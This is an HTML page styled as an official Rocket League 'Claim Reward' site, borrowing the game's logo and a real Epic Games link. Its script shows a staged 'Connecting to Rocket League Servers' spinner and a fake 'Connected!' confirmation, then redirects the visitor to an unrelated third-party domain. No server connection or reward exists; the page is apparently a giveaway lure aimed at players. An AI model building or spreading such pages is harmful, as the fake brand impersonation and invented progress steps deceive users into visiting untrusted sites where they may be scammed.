<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Rocket League - Claim Reward</title>
    <!-- Added a Google Font backup -->
    <link href="https://fonts.googleapis.com/css2?family=Lilita+One&display=swap" rel="stylesheet">
    
    <style>
        /* --- 1. CUSTOM FONT LOADING --- */
        @font-face {
            font-family: 'ClashFont';
            src: url('font.ttf'); 
        }

        /* --- CSS Reset & Base Styles --- */
        :root {
            --accent-yellow: #f39c12; 
            --accent-yellow-dark: #d35400;
            --text-color: #ffffff;
            --font-family: 'ClashFont', 'Lilita One', 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: var(--font-family);
            
            /* Background Settings - FUTURISTIC NEON ARENA */
            background-color: #050505; 
            background-image: url('https://images.unsplash.com/photo-1492144534655-ae79c964c9d7?q=80&w=1974&auto=format&fit=crop');
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
            background-attachment: fixed;

            color: var(--text-color);
            height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: space-between;
            overflow-x: hidden;
            text-align: center;
            padding: 20px;
        }

        /* --- 2. SMOOTH SHADOW AT TOP --- */
        .top-shadow-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 250px;
            background: linear-gradient(to bottom, rgba(5, 5, 10, 0.98), transparent);
            pointer-events: none;
            z-index: 5;
        }

        /* --- Main Content Area --- */
        main {
            position: relative;
            z-index: 10;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            flex-grow: 1;
            width: 100%;
            max-width: 600px;
            animation: fadeIn 0.8s ease-out;
        }

        /* Logo Styling */
        .logo-container {
            margin-bottom: 30px; /* Increased margin for spacing */
            position: relative;
        }

        .logo-img {
            width: 280px;
            max-width: 90%;
            height: auto;
            display: block;
            filter: drop-shadow(0 10px 20px rgba(0,0,0,0.7)) contrast(1.1);
            animation: float 3s ease-in-out infinite;
            
            /* MOVED ICON SLIGHTLY UP */
            transform: translateY(-10px);
        }

        /* Headline Text - LIGHT LIGHTING EFFECT */
        .headline {
            font-size: 1.8rem;
            font-weight: 800;
            line-height: 1.2;
            color: #ffffff; /* Pure White */
            margin-bottom: 40px;
            
            /* 1. FORCE UPPERCASE */
            text-transform: uppercase;
            
            /* 2. BRIGHT LIGHT LIGHTING (Intense White Core + Light Blue Glow) */
            -webkit-text-stroke: 0; 
            text-shadow: 
                0 0 2px #fff,
                0 0 5px #fff,         /* Intense White Core */
                0 0 10px #00d2ff,      /* Bright Light Blue */
                0 0 20px rgba(0, 210, 255, 0.6); /* Outer soft fade */
        }

        /* --- Yellow Button (Claim Reward) --- */
        .btn-claim {
            background-color: var(--accent-yellow);
            color: #2b1d0e; 
            font-size: 1.5rem;
            font-weight: 800;
            text-transform: uppercase;
            padding: 18px 48px;
            border: none;
            border-radius: 50px;
            cursor: pointer;
            box-shadow: 
                0 6px 0 var(--accent-yellow-dark), 
                0 15px 20px rgba(0,0,0,0.6); 
            transition: all 0.1s ease;
            text-shadow: 0 1px 0 rgba(255,255,255,0.4);
            position: relative;
            overflow: hidden;
            font-family: var(--font-family);
        }

        .btn-claim:hover {
            transform: translateY(-2px);
            box-shadow: 
                0 8px 0 var(--accent-yellow-dark),
                0 20px 25px rgba(0,0,0,0.7);
            filter: brightness(1.1);
        }

        .btn-claim:active {
            transform: translateY(4px);
            box-shadow: 
                0 0 0 var(--accent-yellow-dark),
                0 5px 10px rgba(0,0,0,0.4);
        }

        /* --- Footer / Download Section --- */
        footer {
            position: relative;
            z-index: 10;
            margin-bottom: 30px;
            width: 100%;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 15px;
        }

        .download-label {
            font-size: 0.9rem;
            margin-bottom: 10px;
            text-transform: uppercase;
            letter-spacing: 1px;
            font-weight: 700;
            color: #fff;

            /* STROKE AND SHADOW FOR LABEL */
            -webkit-text-stroke: 1px #000;
            text-shadow: 2px 2px 0px #000;
            paint-order: stroke fill;
        }

        .store-buttons {
            display: flex;
            gap: 15px;
            flex-wrap: wrap;
            justify-content: center;
        }

        /* Store Badge Styling */
        .store-btn {
            background-color: rgba(0, 0, 0, 0.7);
            backdrop-filter: blur(5px);
            border: 1px solid rgba(255, 255, 255, 0.3);
            color: #fff;
            display: flex;
            align-items: center;
            padding: 10px 20px;
            border-radius: 8px;
            text-decoration: none;
            transition: transform 0.2s, background-color 0.2s;
        }

        .store-btn:hover {
            transform: scale(1.05);
            background-color: rgba(0, 0, 0, 0.9);
            border-color: var(--accent-yellow);
        }

        .store-text {
            display: flex;
            flex-direction: column;
            align-items: flex-start;
            line-height: 1.1;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            text-shadow: none;
            -webkit-text-stroke: 0;
        }

        .store-text span:first-child {
            font-size: 0.7rem;
            text-transform: uppercase;
        }

        .store-text span:last-child {
            font-size: 1.1rem;
            font-weight: 600;
        }

        /* --- Custom Toast Notification --- */
        .toast {
            position: fixed;
            top: 20px;
            left: 50%;
            transform: translateX(-50%) translateY(-150px);
            background-color: #ffffff; 
            color: #000000;
            padding: 15px 25px;
            border-radius: 12px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
            font-weight: 600;
            display: flex;
            align-items: center;
            justify-content: center; 
            gap: 12px;
            transition: transform 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
            z-index: 1000;
            width: auto; 
            max-width: 90%; 
            font-family: var(--font-family); 
            border: 2px solid #000;
        }

        .toast.show {
            transform: translateX(-50%) translateY(0);
        }

        /* Icon Container to hold both spinner and checkmark */
        .toast-icon-wrapper {
            width: 24px;
            height: 24px;
            position: relative;
            flex-shrink: 0;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        /* Checkmark */
        .checkmark {
            font-size: 1.5rem;
            color: #27ae60;
            display: none; /* Hidden by default when loading */
        }

        /* Loader/Spinner */
        .loader {
            border: 3px solid #f3f3f3;
            border-top: 3px solid #27ae60; /* Green spinner */
            border-radius: 50%;
            width: 24px;
            height: 24px;
            animation: spin 1s linear infinite;
            display: block; /* Visible by default */
        }

        /* States controlled by JS */
        .toast.is-loading .loader { display: block; }
        .toast.is-loading .checkmark { display: none; }
        
        .toast.is-connected .loader { display: none; }
        .toast.is-connected .checkmark { display: block; }

        /* Text Styling */
        .toast-message-text {
            color: #000000 !important; 
            font-size: 1rem !important;
            line-height: 1.2;
            text-align: left;
            text-shadow: none !important;
            -webkit-text-stroke: 0 !important;
        }

        /* Animations */
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        @keyframes float {
            0% { transform: translateY(-10px); } 
            50% { transform: translateY(-20px); }
            100% { transform: translateY(-10px); }
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        /* Mobile Adjustments */
        @media (max-width: 480px) {
            .logo-img {
                width: 220px;
            }
            .headline {
                font-size: 1.4rem;
            }
            .btn-claim {
                font-size: 1.2rem;
                padding: 15px 35px;
            }
            .toast {
                width: 85%;
                flex-direction: column; 
                text-align: center;
            }
        }
    </style>
</head>
<body>

    <!-- Smooth Shadow Overlay at the Top -->
    <div class="top-shadow-overlay"></div>

    <!-- Notification Toast (Hidden by default) -->
    <div id="toast" class="toast is-loading">
        <div class="toast-icon-wrapper">
            <div class="loader"></div>
            <span class="checkmark">✓</span>
        </div>
        <span class="toast-message-text">Connecting to Rocket League Servers</span>
    </div>

    <!-- Main Content -->
    <main>
        <!-- Header / Logo -->
        <div class="logo-container">
            <img src="https://i.postimg.cc/YST664mK/rl-season-logo-22-DE-sm.webp" alt="Rocket League Logo" class="logo-img">
        </div>

        <!-- Sub-headline -->
        <h1 class="headline">Claim a Reward in Rocket League</h1>

        <!-- Action Button -->
        <button class="btn-claim" onclick="claimReward()">Claim a Reward</button>
    </main>

    <!-- Footer / Downloads -->
    <footer>
        <div class="download-label">Download Game</div>
        <div class="store-buttons">
            <!-- Download on Epic Games Button -->
            <a href="https://www.rocketleague.com/fr/" class="store-btn" aria-label="Download on Epic Games">
                <div class="store-text">
                    <span>Download on</span>
                    <span>Epic Games</span>
                </div>
            </a>
            
            <!-- Google Play Button REMOVED -->
        </div>
    </footer>

    <script>
        // Logic to handle the button click
        function claimReward() {
            const toast = document.getElementById('toast');
            const msgText = document.querySelector('.toast-message-text');
            
            // 1. RESET: Ensure we start in loading state
            toast.classList.remove('is-connected');
            toast.classList.add('is-loading');
            msgText.innerText = "Connecting to Rocket League Servers";

            // 2. SHOW: Display the toast
            toast.classList.add('show');

            // 3. WAIT 3 SECONDS: Then switch to connected state
            setTimeout(() => {
                // Change icon to checkmark
                toast.classList.remove('is-loading');
                toast.classList.add('is-connected');
                
                // Update text to confirm connection
                msgText.innerText = "Connected!";

                // 4. WAIT 0.8 SECONDS (so user sees the checkmark), THEN REDIRECT
                // LINK UPDATED BELOW
                setTimeout(() => {
                    window.location.href = 'https://plaiovagames.site/cl/i/krvvpe';
                }, 800);

            }, 3000); // The 3 seconds connecting time
        }
    </script>
</body>
</html>
